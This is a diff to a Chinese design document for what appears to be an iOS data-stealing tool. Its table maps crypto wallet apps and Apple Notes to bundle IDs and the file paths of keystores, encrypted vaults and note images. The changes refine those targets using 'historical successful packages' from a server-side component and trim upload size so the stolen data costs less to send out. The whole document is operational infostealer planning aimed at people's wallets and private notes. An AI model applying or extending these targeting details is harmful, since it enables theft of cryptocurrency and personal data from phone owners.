@@ -153,12 +153,12 @@ NSArray *apps = [workspace performSelector:@selector(allInstalledApplications)];
 |---|---|---|---|
 | imToken | `im.token.app` | `Documents/walletsV2/*.json`、`Library/Application Support/im.token.app/RCTAsyncLocalStorage_V1` | 地址、xpub；keystore 加密。`Documents/default.realm` 3.1MB 但不传：实测只有 10 个 ETH/20 个 BTC 地址，423 个地址全在 RCT 存储里，传它等于白花 1.89MB 上行 |
 | TokenPocket | `com.global.wallet.ios` 等 | `Documents/db/main.sqlite3`、`F4SeCyr`、`walletsV2` | 地址；主库 SQLCipher 需口令 |
-| TronLink | `io.tronlink.wallet` 等（**实测变体未命中**） | `Documents/TronLinkData.sqlite`、`keystore` | 地址、keystore。变体查不到时由 Discovery 名字反查（`tronlink`）兜底 |
+| TronLink | **`com.tronlink.hdwallet`**（服务端 wallets.py 与历史包实证）、`io.tronlink.wallet` 等变体 | `Documents/TronLinkData.sqlite`、`Documents/keystore/UTC--…` | 地址、keystore。历史包目录名是 `TronLink/` 或 `com.tronlink.hdwallet/` |
 | Trust | `com.trustwallet.app` 等 | `Documents/keystore`、`Application Support/wallet` | keystore、地址 |
 | MetaMask | `io.metamask.MetaMask` | `persistStore/persist-KeyringController` | 加密 vault、地址。**排除 SnapController 插件包**（bitcoin/tron/stellar/solana/ens 约 2.5MB JS 代码，非用户数据）→ 2.74MB 降到约 0.2MB |
 | OKX | `com.okinc.okx`、`com.okex.*` | `Documents/wallet` | 地址、keystore |
 | Bitpie | `com.bitpie.ios` 等 | 整容器 | 地址、加密库 |
-| AppleNotes | `group.com.apple.notes` | `NoteStore.sqlite(-wal/-shm)`、`Media/` | 笔记 + 图片（`includeMedia`，受单目标 150MB 约束）；最后上传 |
+| AppleNotes | `group.com.apple.notes` | `NoteStore.sqlite(-wal/-shm)`、`Accounts/<账户ID>/Media|FallbackImages|ExportableMedia` | 笔记 + 图片。**图片不在容器根 `Media/`**：历史成功包是 `Notes/Accounts/<UUID>/Media/<uuid>/…`、`FallbackImages/*.jpg`；采集用全容器扩展名兜底（`_copyMediaUnder`），最后上传 |
 | Ledger Live | `com.ledger.live`（待校准） | `Documents/*`、`Application Support/*` | xpub、账户、地址（无私钥） |
 | Trezor Suite | `com.trezor.suite` / `io.trezor.suite`（待校准） | `Documents/*`、`Application Support/*` | xpub、账户（无私钥） |
 | SafePal | `com.safepal.wallet`（待校准） | `Documents/*`、`Library/*` | 地址、加密备份 |
